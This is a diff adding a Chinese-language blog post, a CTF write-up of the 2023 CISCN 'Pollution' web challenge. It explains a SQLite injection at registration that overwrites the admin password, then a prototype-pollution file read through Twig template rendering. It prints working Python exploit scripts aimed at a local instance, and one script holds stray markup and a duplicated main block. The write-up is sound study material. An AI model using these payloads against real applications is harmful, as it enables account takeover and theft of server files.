@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en" class="light">
+<head>
+  <meta charset="utf-8">
+  
+  <title>
+    
+    2023_CISCN_Pollution
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="me" href="https://mas.uniiem.com/@mizore" />
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/prism.min.js"></script>
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>
+
+  
+<link rel="stylesheet" href="/css/prism/material-light.css">
+
+  
+<link rel="stylesheet" href="/css/prism/material-dark.css">
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Noto+Sans+SC:wght@300&display=swap.css">
+
+  
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Welcome to s4mmy's blog" type="application/atom+xml">
+</head>
+<script>
+  function setIsNight(isNight) {
+    localStorage.setItem('isNight', isNight)
+  }
+
+  function getIsNight() {
+    return localStorage.getItem('isNight')
+  }
+
+  function switchTheme() {
+    let isNight = getIsNight()
+    if (isNight === 'false') {
+      document.documentElement.className = 'dark'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+      setIsNight('true')
+    } else {
+      document.documentElement.className = 'light'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+      setIsNight('false')
+    }
+  }
+
+  let isNight = getIsNight()
+  if (isNight == null) {
+    isNight = 'false'
+    setIsNight('false')
+  }
+  if (isNight === 'false') {
+    document.documentElement.className = 'light'
+  } else {
+    document.documentElement.className = 'dark'
+  }
+</script>
+
+<body>
+  <div class="show-area">
+    <header>
+  <ul class="nav">
+    <li class="nav-child">
+      <a href="/">首页</a>
+    </li>
+    <li class="nav-child">
+      <a href="/categories">分类</a>
+    </li>
+    <li class="nav-child">
+      <a href="/tags">标签</a>
+    </li>
+    <li class="nav-child">
+      <a href="/about">关于</a>
+    </li>
+    <li class="nav-child">
+      <a href="/collection">收藏</a>
+    </li>
+    <li class="nav-child">
+      <a href="/board">留言</a>
+    </li>
+  </ul>
+  <div class="theme-switcher" onclick="switchTheme()">🌞</div>
+  <script>
+    if (isNight === 'false') {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+    } else {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+    }
+  </script>
+</header>
+    <main class="main-body">
+  <div class="toc-container">
+    <div class="toc-toggle">
+      <i id="toc-b-icon" class="iconfont icon-liebiao-01" onclick="toggleShow()"></i>
+    </div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2023-CISCN-Pollution"><span class="toc-number">1.</span> <span class="toc-text">2023_CISCN_Pollution</span></a></li></ol>
+  </div>
+  
+  <script>
+    var show = false
+    function toggleShow() {
+      if (show) {
+        document.getElementsByClassName('toc')[0].className = 'toc'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-liebiao-01'
+      } else {
+        document.getElementsByClassName('toc')[0].className = 'toc show'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-quxiao-01'
+      }
+      show = !show
+    }
+    document.getElementsByClassName('toc')[0].onclick = toggleShow
+  </script>
+  
+  <div class="article-header">
+    <h1 class="article-title">2023_CISCN_Pollution</h1>
+    <div class="article-details">
+      <div class="article-post-date"><span>Posted at </span> 2023-06-24</div>
+      <div class="article-tags">
+        
+      </div>
+    </div>
+  </div>
+  <div class="article">
+  
+  <h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。</p>
+<p>经过注册登录测试可以猜到第一步是需要获得admin的密码。</p>
+<p>在<code>app.js</code>里可以看到下列sql语句</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">db.all(&quot;SELECT * FROM users WHERE username&#x3D;? AND password&#x3D;?&quot;,[username,password],function(err,result)
+
+db.get(&quot;SELECT * FROM users WHERE username&#x3D;?&quot;, [username], function(err, row)
+
+let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;</code></pre>
+
+<p>可以看到前两句都进行了预编译，所以无法进行注入，我们把重点放到第三句上。非常简单的单引号闭合，对于我来说难点就在这里使用的是SQLite进行注入，当时在比赛的时候还没接触过这类的sql注入。。。用sqlmap硬跑没跑出来。</p>
+<p>完整sql查询代码如下</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;;
+            db.run(query,function(err)&#123;
+              if(err)&#123;
+                console.error(err)
+                return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;register&#39;&lt;&#x2F;script&gt;&quot;);
+              &#125;else&#123;
+                return res.send(&quot;&lt;script&gt;alert(&#39;Register successed&#39;);window.location.href&#x3D;&#39;&#x2F;login&#39;&lt;&#x2F;script&gt;&quot;);
+              &#125;</code></pre>
+
+<p>可以看到对于语句执行错误或者成功会统一输出<code>Error</code>或者<code>success</code>，所以这里没办法使用报错注入或者直接联合查询拖库等查看admin密码。</p>
+<p>这里的突破点是直接使用UPDATE语句来更新admin的密码。</p>
+<p>经过测试常规的UPDATE语句没办法直接更新用户的密码，这里使用sqllite里的另一句更新数据的语句</p>
+<pre class="line-numbers language-none"><code class="language-none">.....on CONFLICT DO.....</code></pre>
+
+<p>所以构造如下注入语句</p>
+<pre class="line-numbers language-none"><code class="language-none">admin&#39;, &#39;md5(123456)&#39;) on CONFLICT DO UPDATE password &#x3D; &#39;md5(123456)&#39; --+</code></pre>
+
+<p>据此可以使用python写出如下脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">def SQLinjection(url):
+    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;
+    passwd&#x3D;&#39;123456&#39;
+    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)
+    data&#x3D;&#123;
+        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,
+        &quot;password&quot;:&quot;123456&quot;
+    &#125;
+    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
+    if res.status_code &#x3D;&#x3D; 200 :
+        print(&quot;injected successfully!\n&quot;,res.content)
+    else:
+        print(&quot;injected failed&quot;)
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;
+    SQLinjection(url)</code></pre>
+
+
+
+<p>注入成功后就进入<code>/admin</code>页面了，然而web页面什么都没有。开始审计源码。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app.all(&quot;&#x2F;admin&quot;,utils.checkIsAdmin,function(req,res,next)&#123;
+  if(req.method &#x3D;&#x3D; &quot;GET&quot;)&#123;
+    return res.render(&#39;home&#39;,&#123;&#39;username&#39;:req.session.username&#125;)
+  &#125;
+  if(req.method &#x3D;&#x3D; &quot;POST&quot;)&#123;
+    var Info &#x3D;&#123;
+      &quot;username&quot;:&quot;admin&quot;,
+      &quot;message&quot;:&quot;Try2HackMe!&quot;
+    &#125;
+    try&#123;
+      utils.extend(Info, req.body);
+      return res.render(&#39;admin&#39;, &#123;&quot;username&quot;: Info.username, &quot;message&quot;: Info.message&#125;);
+    &#125;catch(err)&#123;
+      return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;admin&#39;&lt;&#x2F;script&gt;&quot;);
+    &#125;
+  &#125;
+&#125;)</code></pre>
+
+<p>定位到<code>utils.extend</code>在<code>utils.js</code>中查看源码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">static extend(target) &#123;
+        for (var i &#x3D; 1; i &lt; arguments.length; i++) &#123;
+            var source &#x3D; arguments[i]
+            
+            for (var key in source) &#123;
+                if (key &#x3D;&#x3D;&#x3D; &#39;__proto__&#39;) &#123;
+                    return;
+                &#125;
+                if (hasOwnProperty.call(source, key)) &#123;
+                    if (key in source &amp;&amp; key in target) &#123;
+                        Utils.extend(target[key], source[key])
+                    &#125; else &#123;
+                        target[key] &#x3D; source[key]
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+        return target
+    &#125;</code></pre>
+
+<p>很典型的递归调用合并函数。至此可以判断下一步的利用点是原型链污染。</p>
+<p>同时可以看到在<code>__proto__</code>属性被过滤了，这里使用<code>constructor.prototype</code>进行绕过。</p>
+<p>现在把重点放在<code>entxend</code>函数后面的<code>render</code>函数里面。设置debug进行逐行审计。</p>
+<pre class="line-numbers language-none"><code class="language-none">utils.js-&gt;render()
+response.js-&gt;app.render()
+application-&gt;view.render()
+twig.js-&gt;Twig.exports.twig()
+twig.js-&gt;Twig.Templates.loadRemote()
+twig.js-&gt;Twig.Templates.loadRemote()</code></pre>
+
+<p>首先是进入response.js里的res.render()函数,这里的操作就是对一些数据进行了赋值。</p>
+<p>接着进入到了application.js里的app.render()里，也是对一些数据进行了赋值。</p>
+<p>接着进入到了application.js里的this.set(path)</p>
+<p>在view.js里设置了fileName值为变量name的值，即<code>admin</code></p>
+<p>接着在这里</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (!this.ext) &#123;
+   &#x2F;&#x2F; get extension from default engine name
+   this.ext &#x3D; this.defaultEngine[0] !&#x3D;&#x3D; &#39;.&#39;
+     ? &#39;.&#39; + this.defaultEngine
+     : this.defaultEngine;
+
+   fileName +&#x3D; this.ext;
+ &#125;</code></pre>
+
+<p>fileName被设置为了<code>admin.twig</code></p>
+<p>接着还是在view.js里会调用lookup方法，根据文件名<code>admin.twig</code>查找并设置<code>path</code>值</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;&#x2F; lookup path
+this.path &#x3D; this.lookup(fileName);</code></pre>
+
+<p>然后又跳到了application.js里的view.render()里面</p>
+<p>接着到twig.js里的<code>Twig.exports.renderFile()</code>，然后是Twig.exports.twig(params),这里的作用是加载渲染twig模板并输出。</p>
+<p>进入<code>Twig.exports.renderFile()</code>后显示对params的各个参数进行判断</p>
+<p>由于在上面我们知道了path值已经被设置为了<code>admin.twig</code>所以这里会进入判断，同时要注意这里传入的params对象已经没有了path属性。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (params.path !&#x3D;&#x3D; undefined) &#123;
+      return Twig.Templates.loadRemote(params.path, &#123;
+        id: id,
+        method: &#39;fs&#39;,
+        parser: params.parser || &#39;twig&#39;,
+        base: params.base,
+        module: params.module,
+        precompiled: params.precompiled,
+        async: params.async,
+        options: options
+      &#125;, params.load, params.error);
+    &#125;
+  &#125;; &#x2F;&#x2F; Extend Twig with a new filter.</code></pre>
+
+<p>接着是<code>loadRemote</code>函数</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Twig.Templates.loadRemote &#x3D; function (location, params, callback, errorCallback) &#123;
+    &#x2F;&#x2F; Default to the URL so the template is cached.
+    var id &#x3D; typeof params.id &#x3D;&#x3D;&#x3D; &#39;undefined&#39; ? location : params.id;
+    var cached &#x3D; Twig.Templates.registry[id]; &#x2F;&#x2F; Check for existing template
+
+    if (Twig.cache &amp;&amp; typeof cached !&#x3D;&#x3D; &#39;undefined&#39;) &#123;
+      &#x2F;&#x2F; A template is already saved with the given id.
+      if (typeof callback &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;
+        callback(cached);
+      &#125; &#x2F;&#x2F; TODO: if async, return deferred promise
+
+
+      return cached;
+    &#125; &#x2F;&#x2F; If the parser name hasn&#39;t been set, default it to twig
+
+
+    params.parser &#x3D; params.parser || &#39;twig&#39;;
+    params.id &#x3D; id; &#x2F;&#x2F; Default to async
+
+    if (typeof params.async &#x3D;&#x3D;&#x3D; &#39;undefined&#39;) &#123;
+      params.async &#x3D; true;
+    &#125; &#x2F;&#x2F; Assume &#39;fs&#39; if the loader is not defined
+
+
+    var loader &#x3D; this.loaders[params.method] || this.loaders.fs;
+    return loader.call(this, location, params, callback, errorCallback);
+  &#125;; &#x2F;&#x2F; Determine object type</code></pre>
+
+<p>这边是通过params的id来加载模版。location变量正好是上面传入的<code>params.path</code>，且params.id为非空，所以这里是通过<code>params.id</code>来加载模板。而在上面的代码中，id的值也正好是path的值。</p>
+<p><img src="/img/2023ciscn/1.png"></p>
+<p>接着会通过call函数会调用到<code>registerLoader</code>函数</p>
+<p><code>registerLoader</code>函数我们可以关注下面这一条</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (precompiled &#x3D;&#x3D;&#x3D; true) &#123;
+        data &#x3D; JSON.parse(data);
+      &#125;
+
+      params.data &#x3D; data;
+      params.path &#x3D; params.path || location; &#x2F;&#x2F; Template is in data
+</code></pre>
+
+<p>因为在之前params的path属性已经被销毁，这里默认是location的路径。所以这里可以推测出一条利用链，通过原型链污染来控制path属性从而读取任意文件。</p>
+<p>所以原型链可以按如下格式进行构造</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;constructor&quot;:&#123;&quot;protoytpe&quot;:&#123;&quot;path&quot;:&quot;flag路径&quot;&#125;&#125;&#125;</code></pre>
+
+<p>根据上面的分析可以编写以下脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">![2](images&#x2F;2.png)import requests
+import hashlib as md5
+import json
+
+s&#x3D;requests.session()
+url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&quot;
+def SQLinjection(url):
+    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;
+    passwd&#x3D;&#39;123456&#39;
+    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)
+    data&#x3D;&#123;
+        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,
+        &quot;password&quot;:&quot;123456&quot;
+    &#125;
+    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
+    if res.status_code &#x3D;&#x3D; 200 :
+        print(&quot;injected successfully!\n&quot;,res.content)
+    else:
+        print(&quot;injected failed&quot;)
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;
+    SQLinjection(url)
+
+#忘记写登录的逻辑了
+def Login(url):#获取登录session
+    url&#x3D;f&#39;&#123;url&#125;&#x2F;login&#39;
+    data&#x3D;&#123;
+        &quot;username&quot;:&quot;admin&quot;,
+        &quot;password&quot;:&quot;123456&quot;
+    &#125;
+    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
+    if res.status_code &#x3D;&#x3D; 200:
+        print(&quot;Login successful&quot;)
+    else:
+        print(&quot;Login failed&quot;)
+
+
+
+def pollution(url):
+    url&#x3D;f&#39;&#123;url&#125;&#x2F;admin&#39;
+    data&#x3D;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;path&quot;:&quot;&#x2F;Users&#x2F;sammy&#x2F;Desktop&#x2F;临时题目文件夹&#x2F;pollute&#x2F;flag.txt&quot;&#125;&#125;
+    &#125;
+    data&#x3D;json.dumps(data)
+    res&#x3D;s.post(url&#x3D;url,data&#x3D;data,headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;json&quot;&#125;)
+    if res.status_code &#x3D;&#x3D; 200:
+        print(&quot;polluted successfully\n&quot;,res.content)
+    else:
+        print(&quot;polluted failed\n&quot;)
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    SQLinjection(url)
+    Login(url)
+    pollution(url)</code></pre>
+
+<p>获得flag</p>
+<p><img src="/img/2023ciscn/2.png"></p>
+<p>参考文章：kento师傅的复现wp</p>
+
+</div>
+  <o3o key="mizore" api="https://o3o.mizore.site:2333"></o3o>
+  
+<script src="/o3o/o3o.js"></script>
+
+  
+<link rel="stylesheet" href="/css/o3o.css">
+
+</main>
+    <footer>
+  <div class="footer-info"> Powerd by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> | Theme <a
+      target="_blank" rel="noopener" href="https://github.com/mizoreyo/hexo-theme-insnow">Insnow</a> </div>
+  <div class="footer-info">
+    <a class="footer-i" href=""><i class="iconfont icon-wechat"></i></a>
+    <a class="footer-i" target="_blank" rel="noopener" href="https://github.com/sammyLingsj"><i class="iconfont icon-github-fill"></i></a>
+    <a class="footer-i" href="/atom.xml"><i class="iconfont icon-rss"></i></a>
+    <a class="footer-i" href="mailto:sammyLinsj@outlook.com"><i class="iconfont icon-mail"></i></a>
+  </div>
+</footer>
+  </div>
+</body>
+
+
+</html>
